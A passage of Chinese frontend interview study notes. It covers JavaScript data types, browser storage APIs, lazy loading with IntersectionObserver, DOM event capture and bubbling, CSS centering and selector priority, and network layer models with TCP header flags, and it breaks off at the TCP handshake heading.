# JavaScript

## ✔ 基本数据类型

- `Boolean`
- `Number`
- `String`
- `Null`
- `Undefined`
- `Object`
- `Symbol`
- `BigInt`

## ✔ 原始值和引用值

**原始值**即一些代表原始数据类型的值，也叫基本数据类型。这些基本数据类型的访问是按值进行访问的。他们被存储在栈中。包括：

- `Number`
- `String`
- `Boolean`
- `Null`
- `Undefined`
- `Symbol`

**引用值**是把引用变量的**名称存储在栈**中，但是把其**实际对象存在堆**中，且存在一个指针由变量名指向存储在堆中的实际对象，当把引用对象传递给另一个变量时，复制的其实是指向实际对象的指针。包括：

- `Object`
- `Function`
- `Array`
- `Date`
- `RegExp`

## ✔ typeof

下表总结了 `typeof` 可能的返回值。

| 类型            | 结果        |
| :-------------- | :---------- |
| `Boolean`       | `boolean`   |
| `Number`        | `number`    |
| `String`        | `string`    |
| `Null`          | `object`    |
| `Undefined`     | `undefined` |
| `Symbol`        | `symbol`    |
| `Function` 对象 | `function`  |
| `BigInt`        | `bigint`    |
| 其他任何对象    | `object`    |

```javascript
typeof NaN // number
typeof 42n // bigint
typeof Symbol('foo') // symbol
typeof [1, 2, 4] // object
typeof new Date() // object
typeof /regex/ // object
typeof new Boolean(true) // object
typeof new String('abc') // object
typeof function () {} // function
typeof new Function() // function
typeof class C {} // function

const f = () => {}
typeof f // function
```

`typeof null === 'object'` 的原因：在 JavaScript 最初的实现中，JavaScript 中的值是由**一个表示类型的标签和实际数据值表示的**。对象的类型标签是 **0**。由于 `null` 代表的是**空指针**（大多数平台下值为 `0x00`），因此，`null` 的类型标签是 `0`，`typeof null` 也因此返回 `object`。

## ✔ `valueOf` 和 `toString`

## ES7、8、9、10 新特性

![ES-7-8-9-10.png](https://qiniu1.lxfriday.xyz/feoffer%2FES-7-8-9-10.png)

## 箭头函数

## class

## 作用域和作用域链

## JS 执行上下文

ref

- [https://segmentfault.com/a/1190000005654451](https://segmentfault.com/a/1190000005654451)

## 原型链

## 变量查找原理

## 作用域提升

## this 原理

## 闭包原理及其危害

## 多种继承及其优缺点

## async、await 及 generator、promise 的关系

## JS 协程及 async、await

## Proxy

## forin、forof、for、while、reduce、forEach、map 性能对比

## JS GC 原理

ref

- [https://github.com/lxfriday/give-me-job/issues/61](https://github.com/lxfriday/give-me-job/issues/61)

## `use strict` 使用前后的差别

## 浮点数运算不准确

ref

- [https://juejin.im/post/5dab6dd7e51d457805049b18](https://juejin.im/post/5dab6dd7e51d457805049b18)

## 事件循环

ref

- https://juejin.im/post/5d81bc016fb9a06b084d2acc

+async await

## 节流防抖

ref

- [https://juejin.im/post/5d88d68ae51d4561c541a796](https://juejin.im/post/5d88d68ae51d4561c541a796)

## 正则表达式（regexp.exec）

## flatten 递归把数组扁平化

## reduce((prev, curr) => xx)

## setTimeout、setInterval

## requestIdleCallback

## encodeURIComponent 和 encodeURI

## JS 动画

### requestAnimationFrame

- [https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestAnimationFrame](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestAnimationFrame)

## 函数式编程

# 浏览器特有 API

## ✔ localStorage

localStorage 只在相同的域下共享同一空间。**协议和端口**都有影响，注意：

- `http://a.com` 和 `https://a.com` 并**不共享**；
- `http://a.com:80` 和 `http://a.com:8080` **不共享**；
- `http://a.com` 和 `http://a.com:80` **共享**；

### ✔ 常用 API

| 设置                                                                             | 查看                                                                             |
| :------------------------------------------------------------------------------- | :------------------------------------------------------------------------------- |
| ![](http://qiniu1.lxfriday.xyz/feoffer/83dd0a6b-7af1-e1a3-6b4b-ccd89db00def.png) | ![](http://qiniu1.lxfriday.xyz/feoffer/23829b23-1f14-640c-c74a-01c58d6b68a5.png) |

- `localstorage.setItem(key, value)` 存数据，`key` `value` 都会被转换成字符串，为了防止意料之外的情况，最好先将其转化为字符串了再存储；
- `localstorage.getItem(key)` 获取数据，`key` 都会被转换成字符串；
- `localstorage.clear()` 清除当前域下 `localStorage` 存储的数据；
- `localstorage.length` 获取当前域下存储的项目条数；
- `localstorage.key(n:number)` 获取显示面板中第 `n` 条的 `key`，感觉比较鸡肋；

### ✔ 浏览器对 localStorage 容量限制

经测试，Chrome、FireFox、Edge 都是 **5M**（IE 忽略）。

<button id="localStorageQuota" onclick="window.LXFRIDAY_GLOBAL_localStorageQuota()">点我测试存储容量(当前操作会先清空 localStorage)</button>

<div id="localStorageQuota_display"></div>

下面是容量探测代码，可以精确到 1K。

```javascript
const add10KStr = new Array(1024).fill('0000000000').join('') // 10240 Byte => 10K
const add1KStr = new Array(1024).fill('1').join('') // 1024 Byte => 1K
const storageKey = 'QuotaTest'

function localStorageQuota() {
  localStorage.clear()
  function setText(str) {
    console.log(str)
  }
  let total = ''
  let interval = null
  interval = setInterval(() => {
    try {
      setText(`数据插入中 => ${total.length / 1024}K`)

      localStorage.removeItem(storageKey)
      localStorage.setItem(storageKey, total + add1KStr)
      total += add10KStr
    } catch (e) {
      clearInterval(interval)
      if (e && e.code === 22) {
        setText('超过容量(10K增加)')
        setText(`当前存储了${total.length / 1024}K`)
        interval = setInterval(() => {
          try {
            setText(`数据插入中 => ${total.length / 1024}K`)

            localStorage.removeItem(storageKey)
            localStorage.setItem(storageKey, total + add1KStr)
            total += add1KStr
          } catch (ee) {
            clearInterval(interval)
            if (ee && ee.code === 22) {
              setText('超过容量(1K增加)')
              setText(`当前存储了${total.length / 1024}K`)
            }
          }
        }, 0)
      }
    }
  }, 0)
}
```

以 Chrome 为 例，插入不了的时候会抛出异常，`e.code` 是 22。

![localStorage error](https://qiniu1.lxfriday.xyz/feoffer/5a91d578-24a8-b39c-0f11-2775a68fc1ec.png)

### ✔ Storage Event

Storage 事件可以用来在同域下的页面之间实现广播机制，该事件是在 window 上触发的。该事件**不在导致数据变化的当前页面(tab)触发**（如果浏览器同时打开一个域名下面的多个页面，当其中的一个页面改变 `localStorage` 的数据时，其他所有页面的 `storage` 事件会被触发，而原始页面并不触发 `storage` 事件）；

event 包含的关键信息：

- `event.key` 发生变更的 `key`；
- `event.oldValue` 变更之前的值；
- `event.newValue` 变更之后的值；

触发的条件有两个：

1. 不在当前的 tab 触发，相同的 `url` 在两个不同的 tab 也是会触发的；
1. `localstorage.setItem(key, value)` 只有当后一次设置的 `value` 不同的时候才会触发该事件，相同的话也没有必要触发了；

例如在 `https://a.com/a.html` 有如下代码：

```javascript
localStorage.setItem('name', 'lx')
window.addEventListener('storage', e => {
  console.log('e', e)
})
```

这个时候，在 `https://a.com/b.html` 进行了下面的操作：

```javascript
localStorage.setItem('name', 'lxfriday')
```

则 a 页面会打印出下面的内容：

![storage event](http://qiniu1.lxfriday.xyz/feoffer/f615efa9-106e-b78b-5db1-547eca5cf7a3.png)

### ✔ localStorage 的其他用途

ref

- [https://iammapping.com/the-other-ways-to-use-localstorage/](https://iammapping.com/the-other-ways-to-use-localstorage/)

1. 缓存静态文件；
1. 作为前端 DB 的存储介质；

- 灵活存取 json 格式的数据：[https://github.com/typicode/lowdb](https://github.com/typicode/lowdb)
- 通过 sql 对数据 CURD 操作：[https://github.com/agershun/alasql#localstorage-and-dom-storage](https://github.com/agershun/alasql#localstorage-and-dom-storage)

## ✔ sessionStorage

它与 `localStorage` 相似，存储容量也是 **5M**，不同之处在于 `localStorage` 里面存储的数据没有过期时间设置，而存储在 `sessionStorage` 里面的数据在**页面会话结束时会被清除（关闭当前页面的时候会清除）**。

页面会话在浏览器打开期间一直保持，并且**重新加载（刷新）**或恢复页面仍会保持原来的页面会话。在新标签或窗口打开一个页面时会复制顶级浏览会话的上下文作为新会话的上下文，这句不好理解，意思是点击当前页面的 `<a target="_black"></a>` 标签时，在新页面中的 `sessionStorage` 的值是复制的当前页面的，注意并不是共用的。

### ✔ sessionStorage 应用

1. 存储用户输入的内容，当页面刷新的时候可以立刻显示出刷新前的内容；
1. 对使用 browser historay 部署的单页应用，可以在前端使用 sessionStorage 实现路由匹配（不会报 404），不需要使用 nginx 做一次转发；

实现自动匹配路由的过程是这样的：当访问 `a.com/page1` 页面的时候，由于服务器并没有这个页面，服务器会返回 `404.html`（浏览器当前的路由仍然是 `a.com/page1`），浏览器执行 `404.html` 时会先设置 `sessionStorage.redirect` 为当前的 url，然后 `<meta>` 会立刻让页面跳转到 `/`，服务器此时会返回 `index.html`，浏览器执行 `<script>` 中的代码获取到 `sessionStorage.redirect`，然后执行 `histpry.replaceState` 替换当前的 url，这样就达到了想要的跳转效果（[`history.replaceState`](https://developer.mozilla.org/zh-CN/docs/Web/API/History/replaceState) 只会更改浏览器地址栏，不会让浏览器主动去服务器获取对应的页面）。

设置一个 `404.html`，`head` 中包含下面内容

```html
<head>
    ...
    <script>
      sessionStorage.redirect = location.href;
    </script>
    <meta http-equiv="refresh" content="0;URL='/'"></meta>
</head>
```

在单页应用的模板 `index.html` 中，填下面的代码：

```html
<body>
  <div id="root"></div>
  <script>
    // 这段代码要放在其他js的前面
    ;(function () {
      var redirect = sessionStorage.redirect
      delete sessionStorage.redirect
      if (redirect && redirect != location.href) {
        history.replaceState(null, null, redirect)
      }
    })()
  </script>
</body>
```

演示

![sessionStorage 实现页面跳转](https://qiniu1.lxfriday.xyz/feoffer/sessionStorage.gif)

## history

## performance

## navigator

## Observer

### ✔ IntersectionObserver

ref

- [https://developer.mozilla.org/zh-CN/docs/Web/API/Intersection_Observer_API](https://developer.mozilla.org/zh-CN/docs/Web/API/Intersection_Observer_API)

Intersection Observer API 提供了一种**异步**观察目标元素与祖先元素或顶级文档 viewport 的交集中的变化的方法。

这个 API 覆盖最广的最常用的使用方式是"如果两个元素发生的交集部分在**N%**左右，我需要做处理一些事情(执行回调)"。

目标(target)元素与根(root)元素之间的交叉度是交叉比(intersection ratio)。这是目标(target)元素相对于根(root)的交集百分比的表示，它的取值在 0.0 和 1.0 之间。

基本用法：

```javascript
const options = {
  root: document.querySelector('#scrollArea'),
  rootMargin: '0px',
  threshold: [0],
}

const observer = new IntersectionObserver(entries => {
  for (let entry of entries) {
    // Each entry describes an intersection change for one observed
    // target element:
    //   entry.boundingClientRect
    //   entry.intersectionRatio
    //   entry.intersectionRect
    //   entry.isIntersecting
    //   entry.rootBounds
    //   entry.target
    //   entry.time
  }
}, options)

const imgs = document.querySelectorAll('img[data-origin]')
imgs.forEach(el => {
  imgObserver.observe(el)
})
```

**options**

- `root`：指定根(root)元素，用于检查目标的可见性。必须是目标元素的父级元素。如果未指定或者为 `null`，则**默认为浏览器视窗**；
- `rootMargin`：root 元素的外边距，该属性值是用作 root 元素和 target 发生交集时候的计算交集的区域范围，类似于 css 中的 `margin` 属性；
- `threshold`：number 或者 number 数组，target 元素和 root 元素相交程度达到该值的时候 IntersectionObserver 注册的回调函数将会被执行；

当可见性达到 `threshold` 指定的值时，会触发 `IntersectionObserver` 中注册的回调函数，`entries` 是符合可见性条件的元素。

- `entry.boundingClientRect` 目标元素的边界信息，与 [Element.getBoundingClientRect](https://developer.mozilla.org/zh-CN/docs/Web/API/Element/getBoundingClientRect) 相同；
- `entry.intersectionRatio` target 与 root 的交叉比；
- `entry.intersectionRect` 交叉区域的位置、大小信息；
- `entry.isIntersecting` 是否处于交叉状态；
- `entry.rootBounds` 根的位置、大小信息；
- `entry.target` 目标元素；
- `entry.time` 一个记录从 `IntersectionObserver` 的时间原点(time origin)到交叉被触发的时间的时间戳；

#### ✔ IntersectionObserver 实现懒加载

一个简单的图片懒加载例子：

```javascript
if (typeof IntersectionObserver !== undefined) {
  const imgObserver = new IntersectionObserver(
    function (entries) {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          entry.target.src = entry.target.dataset.origin
          // 图片 src 更换之后，就不需要继续观察这个元素了
          imgObserver.unobserve(entry.target)
          console.log('entry', entry)
        }
      })
    },
    {
      root: null,
      threshold: 0,
    }
  )

  const imgs = document.querySelectorAll('img[data-origin]')
  imgs.forEach(el => {
    imgObserver.observe(el)
  })
}
```

#### ✔ 普通懒加载

通过监听滚动事件实现，使用防抖函数防止卡顿：

```javascript
function debounce(func, wait) {
  let timer = null

  return function (...args) {
    if (timer) clearTimeout(timer)
    timer = setTimeout(() => {
      func(...args)
    }, wait)
  }
}
const imgs = document.querySelectorAll('img[data-origin]')
function lazyLoad() {
  const windowHeight = document.documentElement.clientHeight
  imgs.forEach(($img, i) => {
    // 重点是下面这个判断
    if ($img.dataset.origin && $img.getBoundingClientRect().bottom >= 0 && windowHeight >= $img.getBoundingClientRect().top) {
      $img.src = $img.dataset.origin
      delete $img.dataset.origin
    }
  })
}
lazyLoad()
document.addEventListener('scroll', debounce(lazyLoad, 200))
```

### MutationObserver

### PerformanceObserver

### ResizeObserver

# DOM

## DOM 操作(增删改查)

## DOM 属性

## textContent、innerText、innerHTML

## ✔ 事件冒泡、捕捉、代理

### ✔ 事件模型

ref

- [https://www.quirksmode.org/js/events_order.html](https://www.quirksmode.org/js/events_order.html)

事件捕捉（源自 Netscape）

```
               | |
---------------| |-----------------
| element1     | |                |
|   -----------| |-----------     |
|   |element2  \ /          |     |
|   -------------------------     |
|        Event CAPTURING          |
-----------------------------------
```

事件冒泡（源自 Microsoft ）

```
               / \
---------------| |-----------------
| element1     | |                |
|   -----------| |-----------     |
|   |element2  | |          |     |
|   -------------------------     |
|        Event BUBBLING           |
-----------------------------------
```

W3C 事件模型（先捕捉再冒泡）

```
                 | |  / \
-----------------| |--| |-----------------
| element1       | |  | |                |
|   -------------| |--| |-----------     |
|   |element2    \ /  | |          |     |
|   --------------------------------     |
|        W3C event model                 |
------------------------------------------
```

### ✔ addEventListener

用法

```js
target.addEventListener(type, listener, options)
target.addEventListener(type, listener, useCapture)
```

- `type` 表示监听事件类型的字符串；
- `listener` 当所监听的事件类型触发时，会接收到一个事件通知（实现了 [Event](https://developer.mozilla.org/zh-CN/docs/Web/API/Event) 接口的对象）对象；
- `options` 一个指定有关 `listener` 属性的可选参数对象；
  - `capture` (`Boolean`)：是否在捕获阶段触发；
  - `once`(`Boolean`)：是否只调用一次，为 `true` 则在事件调用一次之后会被移除；
  - `passive` (`Boolean`)：设置为 `true` 时，表示 `listener` 永远不会调用 `preventDefault()`。如果 `listener` 仍然调用了这个函数，客户端将会忽略它并抛出一个控制台警告；
- `useCapture`(`Boolean`)：默认为 `false` 表示在冒泡阶段调用，为 `true` 表示在捕获阶段调用；

`addEventListener` 相比 `onXX` ，前者可以对同一事件注册多个监听函数，也可以指定冒泡或者捕获。`addEventListener` 对同一个函数引用无论注册多少次，都只会相当于注册一次，对不同函数引用则会全部注册。

```javascript
box3.addEventListener('click', function (e) {
  console.log('box3')
})
box3.addEventListener('click', function (e) {
  console.log('box3')
})
box3.addEventListener('click', function (e) {
  console.log('box3')
})
// 点击一次 box3，打印三次 box3
```

```javascript
function b3(e) {
  console.log('box3')
}
box3.addEventListener('click', b3)
box3.addEventListener('click', b3)
box3.addEventListener('click', b3)
// 点击一次 box3，打印一次 box3
```

![](https://qiniu1.lxfriday.xyz/feoffer/event-model.png)

```html
<style>
  .box1 {
    width: 300px;
    height: 300px;
    background-color: black;
  }
  .box2 {
    width: 200px;
    height: 200px;
    background-color: cyan;
  }
  .box3 {
    width: 100px;
    height: 100px;
    background-color: white;
  }
</style>

<body>
  <div class="box1">
    1
    <div class="box2">
      2
      <div class="box3">3</div>
    </div>
  </div>
  <script>
    const box1 = document.querySelector('.box1')
    const box2 = document.querySelector('.box2')
    const box3 = document.querySelector('.box3')
  </script>
</body>
```

**冒泡**

```javascript
box1.addEventListener('click', function (e) {
  console.log('box1')
})
box2.addEventListener('click', function (e) {
  console.log('box2')
})
box3.addEventListener('click', function (e) {
  console.log('box3')
})
// 点击 `.box3` 所在的区域时
// box3
// box2
// box1
```

**捕捉**

```javascript
box1.addEventListener(
  'click',
  function (e) {
    console.log('box1')
  },
  true
)
box2.addEventListener(
  'click',
  function (e) {
    console.log('box2')
  },
  true
)
box3.addEventListener(
  'click',
  function (e) {
    console.log('box3')
  },
  true
)
// 点击 `.box3` 所在的区域时
// box1
// box2
// box3
```

**捕捉和冒泡混合**

```javascript
box1.addEventListener(
  'click',
  function (e) {
    console.log('box1')
  },
  true
)
box2.addEventListener('click', function (e) {
  console.log('box2')
})
box3.addEventListener('click', function (e) {
  console.log('box3')
})
// 点击 `.box3` 所在的区域时
// box1
// box3
// box2
```

**在同一个目标元素（捕捉和冒泡切换的末端）上注册了冒泡和捕捉两种事件时，先注册的事件先执行**

```javascript
box1.addEventListener('click', function (e) {
  console.log('box1')
})
box2.addEventListener('click', function (e) {
  console.log('box2')
})
box3.addEventListener(
  'click',
  function (e) {
    console.log('box3 capture')
  },
  true
)
box3.addEventListener('click', function (e) {
  console.log('box3 bubble')
})
// 点击 `.box3` 所在的区域时
// box3 capture
// box3 bubble
// box2
// box1
```

```javascript
box1.addEventListener('click', function (e) {
  console.log('box1')
})
box2.addEventListener('click', function (e) {
  console.log('box2')
})
box3.addEventListener('click', function (e) {
  console.log('box3 bubble')
})
box3.addEventListener(
  'click',
  function (e) {
    console.log('box3 capture')
  },
  true
)
// 点击 `.box3` 所在的区域时
// box3 bubble
// box3 capture
// box2
// box1
```

### ✔ attachEvent

对于 Internet Explorer 来说，在 IE 9 之前，你必须使用 `attachEvent` 而不是使用标准方法 `addEventListener`。

可以使用 `window.event.srcElement` 或者 `e.srcElement` 获取触发事件的元素（是点击时的元素，不一定是绑定事件的元素）。

`attachEvent` 时间处理函数中的 `this` 对应的是 `window`，不是绑定该事件的元素。

```javascript
box1.attachEvent('onclick', function (e) {
  console.log('box1')
  console.log(window.event.srcElement)
  console.log(e.srcElement)
})
```

### ✔ 禁止冒泡、捕捉

在事件监听函数中执行 `e.stopPropagation()`

```javascript
box3.addEventListener('click', function (e) {
  e.stopPropagation()
})
```

### ✔ 获取触发事件的元素

ref

- [https://www.quirksmode.org/js/events_order.html](https://www.quirksmode.org/js/events_order.html)

1. `e.target` 或者 `e.srcElement` 获取到触发事件的元素，它不会变；
1. `e.currentTarget` 获取到处理当前事件的目标对象，它是变化的；
1. `this` 获取绑定该事件的元素；

如果几个不同的元素绑定相同的时间处理函数，当使用 `e.target` 或者 `e.srcElement` 获取目标对象时永远获取的都是那个触发事件的元素。

```javascript
// 点击 box3
box1.addEventListener('click', function (e) {
  console.log('box1 e.target', e.target)
})
box2.addEventListener('click', function (e) {
  console.log('box2 e.target', e.target)
})
```

![](https://qiniu1.lxfriday.xyz/feoffer/event-model-eventtarget.png)

```javascript
// 点击 box3
box1.addEventListener('click', function (e) {
  console.log('box1 this', this)
})
box2.addEventListener('click', function (e) {
  console.log('box2 this', this)
})
```

![](https://qiniu1.lxfriday.xyz/feoffer/event-model-this.png)

### ✔ 事件代理

事件代理是利用事件的冒泡、捕捉机制，让绑定事件更加统一的一种方式。

当我们有一个 `ul`，想在其中动态的增删 `li` 时，事件代理就非常适合在这里使用。

```html
<ul>
  <li key="1" name="lx">11</li>
  <li key="2">22</li>
  <li key="3">33</li>
  <li key="4">44</li>
</ul>

<script>
  ul.addEventListener('click', function (e) {
    console.log('target', e.target) // li
    console.log('key', e.target.attributes.key.value)
  })
</script>
```

我们删除了 `li` 时无需删除事件绑定，也无需为新增的 `li` 绑定事件。点击事件会冒泡到 `ul` 并被这个事件处理程序处理，我们只需要拿到当前点击的元素 `e.taregt` 做对应的处理即可。

## `document.querySelectorXX` 和 `document.getElementByXX` 的区别

## iframe

# V8 专区

## JS 内存泄露

## JS 编译器及解释器

# NodeJS

## commonJS 和 ESM 差异

## EventEmmiter 实现

## Koa

### 洋葱模型

## restful API 介绍及其优缺点

# CSS

## 基础属性

### background

### position

### flex

## less sass postcss 的区别及优缺点

## em rem px rpx dp 单位的区别

## 行内元素、块级元素各自特点及区别

## 伪类

## ✔ 伪类优先级(lvha)

default < `:link` < `:visited` < `:hover` < `:active`

```css
.link {
  color: red;
}
.link:link {
  color: green;
}
.link:visited {
  color: cyan;
}
.link:hover {
  color: yellow;
}
.link:active {
  color: white;
}
```

## 伪元素

## CSS 盒模型

## CSS 写画一个三角形

## 写一个瀑布流布局

## 1px 方案

## 基本布局

## CSS 实现省略号

```css
.ellipsis()  {
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}
```

## ✔ 垂直居中

ref

- [https://juejin.im/post/5b9a4477f265da0ad82bf921](https://juejin.im/post/5b9a4477f265da0ad82bf921)

仅居中定宽高元素适用：

- absolute + 负 margin
- absolute + margin auto
- absolute + calc

居中不定宽高元素：

- absolute + transform
- css-table
- flex
- grid

公共代码

```html
<style>
  /* 公共代码 */
  .wp {
    border: 1px solid red;
    width: 300px;
    height: 300px;
  }

  .box {
    background: green;
  }

  .box.size {
    width: 100px;
    height: 100px;
  }
  /* 公共代码 */
</style>

<div class="wp">
  <div class="box size">123123</div>
</div>
```

### ✔ absolute + 负 margin

必须知道 `.box` 宽高。

```css
.box {
  background: green;
  position: absolute;
  top: 50%;
  left: 50%;
  margin-left: -50px;
  margin-top: -50px;
}
```

### ✔ absolute + margin auto

必须知道 `.box` 宽高

```css
.box {
  background: green;
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  margin: auto;
}
```

### ✔ absolute + calc

需要知道 `.box` 宽高，需要考虑 `calc` 的兼容性，`calc(50% - 50px);` 中 `-` 前后的空格不能省略。

```css
.box {
  background: green;
  position: absolute;
  top: calc(50% - 50px);
  left: calc(50% - 50px);
}
```

### ✔ absolute + transform

`transform` 的 `translate` 使用百分比时是相对当前的元素，所以不需要知道当前元素的大小。

```css
.box {
  background: green;
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}
```

### ✔ css-table

```css
.wp {
  border: 1px solid red;
  width: 300px;
  height: 300px;
  display: table-cell;
  text-align: center;
  vertical-align: middle;
}

.box {
  background-color: green;
  display: inline-block;
}
```

### ✔ flex

比较主流

```css
.wp {
  border: 1px solid red;
  width: 300px;
  height: 300px;
  display: flex;
  justify-content: center;
  align-items: center;
}
```

### ✔ grid

兼容性比较差

```css
.wp {
  border: 1px solid red;
  width: 300px;
  height: 300px;
  display: grid;
}

.box {
  background-color: green;
  align-self: center;
  justify-self: center;
}
```

## reflow、repaint

## 外边距折叠（BFC）

## 清除浮动

## ✔ CSS 选择器优先级

ref

- [https://juejin.im/post/5dd27cfbf265da0bad797dc6](https://juejin.im/post/5dd27cfbf265da0bad797dc6)

选择器类型：

对优先级无影响的：

1. 通配选择符 (`*`)
1. 关系选择器
   1. `+` 相邻兄弟选择器
   1. `~` 通用兄弟选择器
   1. `>` 子选择器
   1. `' '` 后代选择器
1. 伪元素选择器(`::before`)

对优先级有影响的：

1. `!important`
1. 内联样式
1. id 选择器(`#box`)
1. 伪类选择器(`:hover`)
1. 类选择器(`.container`)
1. 属性选择器(`[name=lxfriday]`)
1. 元素选择器(`h1`)

- `!important` > 内联样式 style > id 选择器 > 伪类选择器 > 属性选择器 = class 选择器 > 元素(类型)选择器；
- 相同的选择器，后面声明的比前面声明的优先级高，相同属性后者覆盖前者；

关系选择器 > 通配符选择器

伪元素的属性部分继承自元素，由于伪元素无法用其他选择器选中，所以不参与优先级排序。

`!important` 如何覆盖：

- 方法 1：内联样式设置了 `!important` ，使用 js(`el.style.color = 'red'`) 可以消除；
- 方法 2：再添加一条带 `!important` 的 CSS 规则，再给这个给选择器更高的优先级（添加一个标签，ID 或类）；
- 方法 3：使用相同的选择器，但是置于已有的样式之后（后者覆盖前者）；

经典题：两个 `div` 内的文字都是 `red`，因为 `.blue` `.red` 优先级相同，后声明的覆盖前者。

```html
<body>
  <style>
    .blue {
      color: blue;
    }
    .red {
      color: red;
    }
  </style>
  <div>
    <div class="blue red">111</div>
    <div class="red blue">111</div>
  </div>
</body>
```

## flex: flex-grow flex-shrink flex-basis

ref

- [https://juejin.im/post/589965c9128fe1006569cc9d#heading-3](https://juejin.im/post/589965c9128fe1006569cc9d#heading-3)

## keyframes

# React

## React Context

## React 事件机制

ref

- [https://juejin.im/post/5c7df2e7f265da2d8a55d49d](https://juejin.im/post/5c7df2e7f265da2d8a55d49d)

## React 事件绑定 this

## React Fiber

ref

- [https://zhuanlan.zhihu.com/p/37095662](https://zhuanlan.zhihu.com/p/37095662)
- [https://juejin.im/post/5dadc6045188255a270a0f85](https://juejin.im/post/5dadc6045188255a270a0f85)

## setState 原理

ref

- [https://juejin.im/post/5b45c57c51882519790c7441](https://juejin.im/post/5b45c57c51882519790c7441)
- [测试 code](https://codesandbox.io/s/modest-volhard-0l3ov?fontsize=14&hidenavigation=1&theme=dark)

## HOC

## HOOKS 原理

## 虚拟 DOM

## React Router 原理

## Redux 原理

## Redux Saga 原理

## immer

## immutable

# Webpack

## Loader 编写

## Plugin 编写

# Axios

## Axios 封装

# HTML

## doctype

## html5 相比以前有什么变化

## html5 新增标签

## HTML Element 和 HTML Node

ref

- [https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLElement](https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLElement)
- [https://developer.mozilla.org/zh-CN/docs/Web/API/Node](https://developer.mozilla.org/zh-CN/docs/Web/API/Node)

## `<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />`

IE8/9 及以后的版本都会以最高版本 IE 来渲染页面，用来指定 IE 浏览器去模拟某个特定版本的 IE 浏览器的渲染方式(如 IE6)，以此来解决部分兼容问题，如果存在 GCF(Google Chrome Frame)则使用 GCF 渲染，否则使用最高版本的 IE 内核进行渲染。

## seo 优化

# 协议（HTTP+TCP+UDP）

## ✔ OSI 七层网络分层模型

ref

- [https://baike.baidu.com/item/%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/1441391](https://baike.baidu.com/item/%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/1441391)
- [https://www.zhihu.com/question/24002080/answer/410983148](https://www.zhihu.com/question/24002080/answer/410983148)

开放式系统互联通信参考模型（Open System Interconnection Reference Model）。

| 名称       | 特征                                                                                                                                        |
| :--------- | :------------------------------------------------------------------------------------------------------------------------------------------ |
| 应用层     | 网络服务与最终用户的一个接口。包含：**HTTP HTTPS DNS TELNET FTP DHCP TFTP SMTP SNMP POP3** 。                                               |
| 表示层     | 提供数据压缩、解压、加密等服务，为应用层提供语法选择，语法转换。                                                                            |
| 会话层     | 建立、管理、终止会话。对应主机进程，指本地主机与远程主机正在进行的会话。                                                                    |
| 传输层     | 定义传输数据的协议端口号，以及流控和差错校验。包括 **TCP，UDP，SPX**。                                                                      |
| 网络层     | 基于 IP 地址为数据的传输进行网络间的路由选择。包括 **ICMP IGMP IP（IPV4 IPV6）**，**路由器**工作在网络层。                                  |
| 数据链路层 | 建立逻辑连接、**进行硬件地址寻址**、差错校验等功能。将比特组合成字节进而组合成帧，用 MAC 地址访问介质，错误发现但不能纠正。包括：**交换机** |
| 物理层     | 为数据传输提供物理媒体，进行数据的实际传输。包含：**网线、光纤**                                                                            |

## ✔ TCP/IP 四层网络分层模型

![](https://qiniu1.lxfriday.xyz/feoffer/tcp-network-model.png)

| 名称                      | 特征                                                                                                                          |
| :------------------------ | :---------------------------------------------------------------------------------------------------------------------------- |
| 应用层(application layer) | 有各种面向具体应用的协议。包含 Telnet、SSH、FTP、SMTP 、HTTP 等等                                                             |
| 传输层(transport layer)   | 保证数据在 IP 地址标记的两点之间“可靠”地传输，是 TCP 协议工作的层次，另外还包括 UDP                                           |
| 网际层(internet layer)    | 包含 IP 协议，可以在链接层的基础上，用 IP 地址取代 MAC 地址，把许许多多的局域网、广域网连接成一个虚拟的巨大网络               |
| 链接层(link layer)        | 负责在以太网、WiFi 这样的底层网络上发送原始数据包，工作在网卡这个层次，使用 MAC 地址来标记网络上的设备，所以有时候也叫 MAC 层 |

链接层的传输单位是帧（frame），IP 层的传输单位是包（packet），TCP 层的传输单位是段（segment），HTTP 的传输单位是消息或者报文（message）。

OSI 网络模型和 TCP 网络模型的对应关系

![](https://qiniu1.lxfriday.xyz/feoffer/tcp-network-model-osi-model.png)

## ✔ TCP

ref

- [TCP 的那些事儿（上）](https://coolshell.cn/articles/11564.html)
- [TCP 的那些事儿（下）](https://coolshell.cn/articles/11609.html)

### ✔ TCP 头信息

![TCP 头](https://qiniu1.lxfriday.xyz/feoffer/tcp-header-01.png)

六个标志位的含义：

| 字段  | 含义                                                                         |
| :---- | :--------------------------------------------------------------------------- |
| `SYN` | 请求建立连接，并在其序列号的字段进行序列号的初始值设定。建立连接，设置为 1。 |
| `ACK` | 确认号是否有效，一般置为 1。                                                 |
| `FIN` | 希望断开连接。                                                               |
| `PSH` | 提示接收端应用程序立即从 TCP 缓冲区把数据读走。                              |
| `RST` | 对方要求重新建立连接，复位。                                                 |
| `URG` | 紧急指针是否有效。为 1，表示某一位需要被优先处理                             |

- 序列号 seq：占 4 个字节，用来标记数据段的顺序，解决网络包乱序的问题。序列号表示报文段携带数据的第一个字节的编号；
- 确认号 ack：占 4 个字节，表示期待收到对方下一个报文段的第一个数据字节的序号，当前报文段最后一个字节的编号+1 即为确认号。
- 确认 ACK 标志位：占 1 位，仅当 ACK=1 时，确认号 ack 字段才有效。ACK=0 时，确认号 ack 无效；
- 同步 SYN 标志位：连接建立时用于同步序号。当 SYN=1，ACK=0 时表示：这是一个连接请求报文段。若同意连接，则在响应报文段中使得 SYN=1，ACK=1。SYN 这个标志位只有在 TCP 建产连接时才会被置 1，握手完成后 SYN 标志位被置 0；
- 终止 FIN 标志位：用来释放一个连接。FIN=1 表示：此报文段的发送方的数据已经发送完毕，并要求释放运输连接；

**大写的 SYN ACK 都是标志位，其值为 1 或 0，小写的 ack、seq 单词表示序号，和具体的传输内容有关。**

### ✔ 三次握手

ref

